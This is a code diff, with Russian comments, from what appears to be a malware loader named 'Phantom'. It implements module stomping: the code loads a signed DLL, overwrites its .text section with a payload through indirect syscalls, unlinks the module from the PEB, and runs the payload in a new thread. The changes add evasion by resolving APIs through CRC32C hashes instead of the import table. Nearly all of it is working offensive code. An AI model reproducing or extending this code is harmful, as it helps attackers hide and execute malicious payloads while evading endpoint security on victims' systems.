@@ -44,8 +44,15 @@ namespace Phantom
     // (VAD entry не меняется при NtProtectVirtualMemory)
     static bool VerifyMemImage(void* address, size_t size)
     {
+        // Resolve VirtualQuery via CRC32C hash
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+        auto pVQ = (SIZE_T(WINAPI*)(LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T))
+            Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualQuery);
+        if (!pVQ) return false;
+
         MEMORY_BASIC_INFORMATION mbi = {};
-        SIZE_T result = VirtualQuery(address, &mbi, sizeof(mbi));
+        SIZE_T result = pVQ(address, &mbi, sizeof(mbi));
         if (result == 0) return false;
 
         return mbi.Type == MEM_IMAGE;
@@ -110,17 +117,18 @@ namespace Phantom
 
         HMODULE hTarget = nullptr;
 
-        // Разрешаем LoadLibraryA через DJB2-хеш (без IAT)
-        HMODULE hK32 = Api::GetModuleByHash(Api::Mod::KERNEL32);
+        // Resolve LoadLibraryA + FreeLibrary via CRC32C hash
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (!hK32) return;
 
-        typedef HMODULE(WINAPI* fnLoadLibA)(LPCSTR);
-        fnLoadLibA pLoadLib = (fnLoadLibA)Api::GetProcByHash(hK32, Api::Fn::LoadLibraryA);
-        if (!pLoadLib) return;
+        auto pLL = (HMODULE(WINAPI*)(LPCSTR))Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
+        auto pFL = (BOOL(WINAPI*)(HMODULE))Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("FreeLibrary"));
+        auto pWFSO = (DWORD(WINAPI*)(HANDLE,DWORD))Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("WaitForSingleObject"));
+        if (!pLL || !pFL) return;
 
         const char* dlls[] = { dll1, dll2, dll3, dll4, dll5 };
         for (int i = 0; i < 5 && !hTarget; i++)
-            hTarget = pLoadLib(dlls[i]);
+            hTarget = pLL(dlls[i]);
 
         if (!hTarget) return;
 
@@ -129,29 +137,28 @@ namespace Phantom
         size_t textSize = 0;
         if (!FindTextSection(hTarget, &textBase, &textSize))
         {
-            FreeLibrary(hTarget);
+            pFL(hTarget);
             return;
         }
 
         // Проверяем размер — .text должен вместить payload
         if (textSize < size)
         {
-            FreeLibrary(hTarget);
+            pFL(hTarget);
             return;
         }
 
-        // Меняем защиту на PAGE_READWRITE через NtProtectVirtualMemory
-        // Используем косвенный syscall вместо VirtualProtect из kernel32
+        // Меняем защиту на PAGE_READWRITE через indirect syscall
         PVOID baseAddr = textBase;
         SIZE_T regionSize = size;
         ULONG oldProtect = 0;
         NTSTATUS status = Syscall::NtProtectVirtualMemory(
-            GetCurrentProcess(), &baseAddr, &regionSize,
+            (HANDLE)(LONG_PTR)-1, &baseAddr, &regionSize,
             PAGE_READWRITE, &oldProtect);
 
         if (status != 0)
         {
-            FreeLibrary(hTarget);
+            pFL(hTarget);
             return;
         }
 
@@ -160,10 +167,11 @@ namespace Phantom
         // Копируем только payload, остальная часть DLL остаётся легитимной
         memcpy(textBase, payload, size);
 
-        // Восстанавливаем PAGE_EXECUTE_READ через косвенный syscall
+        // Восстанавливаем PAGE_EXECUTE_READ через indirect syscall
+        baseAddr = textBase;
         regionSize = size;
         Syscall::NtProtectVirtualMemory(
-            GetCurrentProcess(), &baseAddr, &regionSize,
+            (HANDLE)(LONG_PTR)-1, &baseAddr, &regionSize,
             PAGE_EXECUTE_READ, &oldProtect);
 
         // Проверяем MEM_IMAGE — регион должен оставаться Image-backed
@@ -180,15 +188,17 @@ namespace Phantom
         UnlinkFromPeb(hTarget);
 
         // Выполняем из адресного пространства подписанной DLL
-        // Используем CreateThread — TODO: заменить на callback proxy
-        HANDLE hThread = CreateThread(NULL, 0,
-                                      (LPTHREAD_START_ROUTINE)textBase,
-                                      NULL, 0, NULL);
+        // CreateThread через indirect syscall NtCreateThreadEx
+        HANDLE hThread = nullptr;
+        Syscall::NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr,
+            (HANDLE)(LONG_PTR)-1, (PVOID)textBase, nullptr,
+            0, 0, 0, 0, nullptr);
 
         if (hThread)
         {
-            WaitForSingleObject(hThread, INFINITE);
-            CloseHandle(hThread);
+            // WaitForSingleObject через hash resolution (без IAT)
+            if (pWFSO) pWFSO(hThread, INFINITE);
+            Syscall::NtClose(hThread);
         }
     }
 }
